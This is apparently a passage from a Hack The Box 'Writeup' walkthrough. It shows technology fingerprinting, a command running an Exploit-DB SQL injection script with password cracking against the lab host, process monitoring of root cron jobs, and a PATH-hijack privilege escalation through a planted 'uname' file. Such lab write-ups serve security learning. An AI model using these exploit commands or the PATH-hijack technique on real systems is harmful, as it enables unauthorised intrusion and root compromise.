...
![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/wri1.png)
...
![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/wri2.png)
### Wappalyzer

Wappalyzer is a add-on for firefox. It can be used for identifying the technologies used by a website.


![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/wri4.png)
...
![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/wri3.png)
...
```bash
root@kali:~# python /usr/share/exploitdb/exploits/php/webapps/46635.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt
...
Enumeration showed that there are some cron jobs that run.
...
I downloaded it to my system and copied it to the target via `wget`. This is very useful for monitoring the `cronjobs` or other processes that run in
the background.
...
| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
...
2019/10/26 01:45:16 CMD: UID=0    PID=2202   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
...
```
These directories are writable and they are at higher position in `PATH` variable. So if we create a file named `uname` in this path, the system will
execute its contents as root. So we can run any code we want.
